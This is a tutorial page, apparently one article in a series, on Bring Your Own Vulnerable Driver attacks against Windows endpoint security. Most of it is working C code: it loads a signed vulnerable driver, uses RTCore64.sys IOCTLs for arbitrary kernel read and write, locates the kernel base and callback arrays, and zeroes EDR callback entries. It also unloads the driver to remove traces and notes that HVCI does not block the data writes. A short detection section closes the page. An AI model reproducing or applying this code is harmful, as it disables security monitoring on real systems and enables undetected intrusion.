---
layout: page
title: "BYOVD: Exploiting Signed Drivers to Reach the Kernel"
---

# BYOVD: Exploiting Signed Drivers to Reach the Kernel

The previous article established that kernel callbacks are the detection layer that user-mode techniques cannot address. Reaching those callbacks requires kernel code execution. On a modern Windows system, kernel code execution requires a signed driver. Driver Signature Enforcement (DSE) blocks unsigned drivers from loading. Secure Boot and HVCI push that enforcement to the hypervisor level.

Bring Your Own Vulnerable Driver (BYOVD) is the resolution to this constraint. Instead of trying to bypass DSE, the technique loads a driver that is already signed. The driver is legitimate, recognized by Windows, and loads without complaint. It also contains a vulnerability that allows a user-mode process to send it an IOCTL that provides arbitrary kernel read or write access. With that primitive, the user-mode process can modify any kernel structure, including the callback arrays where EDR callbacks are registered.

## Why Legitimate Drivers Have These Vulnerabilities

Hardware vendors ship drivers for overclocking tools, fan controllers, diagnostic utilities, and low-level system management applications. These tools legitimately need to access hardware registers, physical memory, or kernel structures. To avoid requiring the user to run everything as SYSTEM, the driver exposes an IOCTL interface that performs the privileged operation on behalf of any user-mode caller.

The vulnerability is the access control on that IOCTL: often none. Any process that opens the device handle can send an arbitrary kernel read or write. The vendor's application uses this to read a hardware sensor. An attacker uses it to zero a callback array entry.

## Loading a Vulnerable Driver

The driver is a `.sys` file. Loading it requires either `sc.exe` from an elevated context or the `NtLoadDriver` NTAPI function. Both require `SeLoadDriverPrivilege`, which is available to administrators.

```c
#include <windows.h>

NTSTATUS load_driver(const wchar_t *driver_path, const wchar_t *service_name) {
    // Create the service registry key
    wchar_t reg_path[512];
    swprintf_s(reg_path, 512,
        L"SYSTEM\\CurrentControlSet\\Services\\%s", service_name);

    HKEY key;
    RegCreateKeyExW(HKEY_LOCAL_MACHINE, reg_path,
                    0, NULL, 0, KEY_ALL_ACCESS, NULL, &key, NULL);

    DWORD type      = 1;   // SERVICE_KERNEL_DRIVER
    DWORD start     = 3;   // SERVICE_DEMAND_START
    DWORD error     = 1;   // SERVICE_ERROR_NORMAL

    RegSetValueExW(key, L"Type",      0, REG_DWORD, (BYTE *)&type,  4);
    RegSetValueExW(key, L"Start",     0, REG_DWORD, (BYTE *)&start, 4);
    RegSetValueExW(key, L"ErrorControl", 0, REG_DWORD, (BYTE *)&error, 4);
    RegSetValueExW(key, L"ImagePath", 0, REG_EXPAND_SZ,
                   (BYTE *)driver_path,
                   (DWORD)((wcslen(driver_path) + 1) * 2));
    RegCloseKey(key);

    // Build the registry path for NtLoadDriver
    wchar_t nt_service_path[512];
    swprintf_s(nt_service_path, 512,
        L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\%s",
        service_name);

    UNICODE_STRING us_path;
    us_path.Length        = (USHORT)(wcslen(nt_service_path) * 2);
    us_path.MaximumLength = us_path.Length + 2;
    us_path.Buffer        = nt_service_path;

    typedef NTSTATUS (NTAPI *NtLoadDriver_t)(PUNICODE_STRING);
    NtLoadDriver_t NtLoadDriver =
        (NtLoadDriver_t)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtLoadDriver");

    return NtLoadDriver(&us_path);
}
```

After loading, the driver creates a device object accessible through a named device path (`\\.\DriverName`). The user-mode process opens this with `CreateFile` and sends IOCTLs through `DeviceIoControl`.

## The Read/Write Primitive

Different vulnerable drivers expose different interfaces, but the pattern is consistent: an IOCTL that accepts a kernel address and a value, and either reads from or writes to that address.

RTCore64.sys (distributed with MSI Afterburner) exposed IOCTLs for memory read and write with no authentication:

```c
// RTCore64 IOCTL structures (reversed from the driver)
typedef struct {
    BYTE  pad0[8];
    ULONG64 address;    // kernel virtual address to read from
    BYTE  pad1[4];
    ULONG  read_size;   // 1, 2, or 4 bytes
    ULONG  out_value;   // value read from kernel memory
    BYTE  pad2[16];
} RTCORE64_MEMORY_READ;

typedef struct {
    BYTE  pad0[8];
    ULONG64 address;    // kernel virtual address to write to
    BYTE  pad1[4];
    ULONG  write_size;  // 1, 2, or 4 bytes
    ULONG  in_value;    // value to write
    BYTE  pad2[16];
} RTCORE64_MEMORY_WRITE;

#define RTCORE64_MEMORY_READ_CODE  0x80002048
#define RTCORE64_MEMORY_WRITE_CODE 0x8000204C

ULONG kernel_read(HANDLE device, ULONG64 address) {
    RTCORE64_MEMORY_READ req = {0};
    req.address    = address;
    req.read_size  = 4;

    DWORD bytes;
    DeviceIoControl(device, RTCORE64_MEMORY_READ_CODE,
                    &req, sizeof(req), &req, sizeof(req),
                    &bytes, NULL);
    return req.out_value;
}

void kernel_write(HANDLE device, ULONG64 address, ULONG value) {
    RTCORE64_MEMORY_WRITE req = {0};
    req.address    = address;
    req.write_size = 4;
    req.in_value   = value;

    DWORD bytes;
    DeviceIoControl(device, RTCORE64_MEMORY_WRITE_CODE,
                    &req, sizeof(req), &req, sizeof(req),
                    &bytes, NULL);
}
```

With `kernel_read` and `kernel_write`, any kernel virtual address is accessible from user space. The privileged boundary has been eliminated.

## Finding the Kernel Base

The callback arrays are at addresses relative to the kernel image base (NTOSKRNL). Finding the base from user space uses `NtQuerySystemInformation` with `SystemModuleInformation`:

```c
#include <winternl.h>

typedef struct {
    ULONG  Reserved1;
    ULONG  Reserved2;
    PVOID  ImageBase;
    ULONG  ImageSize;
    ULONG  Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    CHAR   FullPathName[256];
} SYSTEM_MODULE;

typedef struct {
    ULONG         ModulesCount;
    SYSTEM_MODULE Modules[1];
} SYSTEM_MODULE_INFORMATION;

ULONG64 get_kernel_base(void) {
    typedef NTSTATUS (NTAPI *NtQuerySysInfo_t)(ULONG, PVOID, ULONG, PULONG);
    NtQuerySysInfo_t NtQSI =
        (NtQuerySysInfo_t)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

    ULONG size = 0;
    NtQSI(11 /* SystemModuleInformation */, NULL, 0, &size);

    SYSTEM_MODULE_INFORMATION *info =
        (SYSTEM_MODULE_INFORMATION *)malloc(size);
    NtQSI(11, info, size, &size);

    // First module is always ntoskrnl.exe
    ULONG64 base = (ULONG64)info->Modules[0].ImageBase;
    free(info);
    return base;
}
```

`NtQuerySystemInformation` with `SystemModuleInformation` returns the list of loaded kernel modules in load order. The first entry is always NTOSKRNL. Its `ImageBase` is the kernel's virtual address, usable as the base for offset calculations.

## Finding Callback Array Offsets

The callback arrays are not exported symbols. Their offsets from the kernel base vary by Windows build. Two approaches find them.

**Pattern scanning**: Read the `.text` section of NTOSKRNL from disk and search for the byte pattern that precedes the array reference in known functions. `PsSetCreateProcessNotifyRoutine` references `PspCreateProcessNotifyRoutine` directly. The instruction sequence that writes to the array is distinctive. Scanning for it in the kernel image and computing the referenced address gives the array location at runtime.

```c
// Conceptual: scan NTOSKRNL on disk for the pattern preceding
// PspCreateProcessNotifyRoutine reference
// Pattern: 4C 8D 15 ?? ?? ?? ??   lea r10, [rip+offset]
// The 32-bit displacement + rip + instruction_length = array address

ULONG64 find_callback_array(ULONG64 kernel_base,
                             BYTE *kernel_image_on_disk,
                             SIZE_T kernel_image_size,
                             const BYTE *pattern,
                             SIZE_T pattern_len,
                             int displacement_offset)
{
    for (SIZE_T i = 0; i < kernel_image_size - pattern_len; i++) {
        if (memcmp(kernel_image_on_disk + i, pattern, pattern_len) == 0) {
            // Read the 32-bit displacement
            INT32 disp = *(INT32 *)(kernel_image_on_disk + i + displacement_offset);
            // RIP at the end of the instruction (offset + instruction_length)
            ULONG64 rip = kernel_base + i + displacement_offset + 4;
            return rip + disp;
        }
    }
    return 0;
}
```

**Version-based offset tables**: Precompute offsets for each Windows build (major version, minor version, build number) and ship a lookup table. Less robust against updates but simpler to implement.

## Zeroing Callback Entries

With the array address and the read/write primitive, removing a callback is two operations: read the entry, verify it is non-null, write zero.

```c
#define MAX_CALLBACKS 64
#define CALLBACK_ENTRY_SIZE 8  // 64-bit pointer

void remove_process_callbacks(HANDLE device, ULONG64 array_addr) {
    for (int i = 0; i < MAX_CALLBACKS; i++) {
        ULONG64 entry_addr = array_addr + (i * CALLBACK_ENTRY_SIZE);

        // Read 8 bytes (64-bit pointer)
        ULONG lo = kernel_read(device, entry_addr);
        ULONG hi = kernel_read(device, entry_addr + 4);
        ULONG64 entry = ((ULONG64)hi << 32) | lo;

        if (entry == 0) continue;

        // Mask off low bits (used as flags)
        ULONG64 callback_block = entry & ~0xFULL;

        // Could inspect the callback's module here to selectively
        // remove only the EDR's callback, preserving others

        // Zero the entry: driver's callback is never called again
        kernel_write(device, entry_addr,     0);
        kernel_write(device, entry_addr + 4, 0);
    }
}
```

Selective removal targets only the EDR's driver entries, leaving Windows security callbacks intact to avoid instability. Identifying which entry belongs to which driver requires reading the `EX_CALLBACK_ROUTINE_BLOCK` structure pointed to by the entry and resolving the callback function address back to a module name.

## Handling ObRegisterCallbacks

Object callbacks are more complex to remove. They are stored in the `CallbackList` of the `_OBJECT_TYPE` structure, not in a simple array. The list is doubly linked. Removing an EDR's object callback requires finding the `_OBJECT_TYPE` for process objects through `PsProcessType`, walking the `CallbackList`, and unlinking entries that point into the EDR's driver.

The `_OBJECT_TYPE` structure and its offset to `CallbackList` are undocumented and version-specific. Public tools that implement this (such as EDRSandBlast) maintain offset tables per Windows build.

## Unloading the Driver

After the callbacks are removed, the vulnerable driver is unloaded to minimize its footprint:

```c
NTSTATUS unload_driver(const wchar_t *service_name) {
    wchar_t nt_service_path[512];
    swprintf_s(nt_service_path, 512,
        L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\%s",
        service_name);

    UNICODE_STRING us_path = {
        .Length        = (USHORT)(wcslen(nt_service_path) * 2),
        .MaximumLength = (USHORT)((wcslen(nt_service_path) + 1) * 2),
        .Buffer        = nt_service_path
    };

    typedef NTSTATUS (NTAPI *NtUnloadDriver_t)(PUNICODE_STRING);
    NtUnloadDriver_t NtUnloadDriver =
        (NtUnloadDriver_t)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtUnloadDriver");

    return NtUnloadDriver(&us_path);
}
```

The driver is unloaded. The service registry key is deleted. The `.sys` file is removed from disk. What remains is a kernel with zeroed callback entries and no evidence of the driver that zeroed them, other than the event log entry from the driver load (which is itself a detectable artifact).

## HVCI and the Blocklist

Hypervisor-Protected Code Integrity (HVCI) enforces driver signing at the hypervisor level. Code pages in the kernel are mapped read-only in the second-level address translation maintained by the hypervisor. No kernel driver can modify its own code pages or those of other drivers. Kernel memory that HVCI marks as read-only cannot be written even from kernel mode.

HVCI also enforces that only drivers signed with a certificate on the allow list can load. The Microsoft Vulnerable Driver Blocklist contains hashes of known vulnerable drivers. With HVCI enabled, a vulnerable driver on the blocklist is refused at load time.

BYOVD against a system with HVCI enabled requires a driver that is:
1. Signed with a valid certificate
2. Not on the Microsoft blocklist
3. Contains a vulnerability providing kernel read/write

New vulnerable drivers are found and used before their hashes are added to the blocklist. The blocklist is reactive, not preventive. The window between discovery and blocklist addition is the operational window for a given driver.

HVCI does not prevent writing to non-code kernel memory (data pages, pool allocations). The callback arrays are in non-paged pool, not in code pages. Writing to them is not blocked by HVCI, which means zeroing callback entries through the IOCTL primitive works even on HVCI-enabled systems, as long as the vulnerable driver loads.

## Detection of BYOVD

BYOVD is detectable through several channels:

**Driver load events**: Loading any driver generates a Windows event log entry (Event ID 7045 in the System log). EDRs that monitor driver loads flag unexpected kernel drivers appearing on endpoints.

**Image load callbacks**: `PsSetLoadImageNotifyRoutine` fires when a driver loads. The EDR's callback receives the driver path and can check it against an allowlist. This creates a race condition if the BYOVD technique removes the image load callback before loading additional drivers, but the initial vulnerable driver load is always visible.

**Known driver hashes**: The vulnerable driver file on disk matches a known hash from public research. Filesystem scanners flag it on write.

**IOCTL patterns**: The specific IOCTL codes used by known vulnerable drivers are documented. Monitoring `DeviceIoControl` calls for these codes is possible from user space before any driver is loaded.

The operational reality: BYOVD leaves artifacts. The goal is not artifact-free operation but operation that completes before the artifacts are acted on.
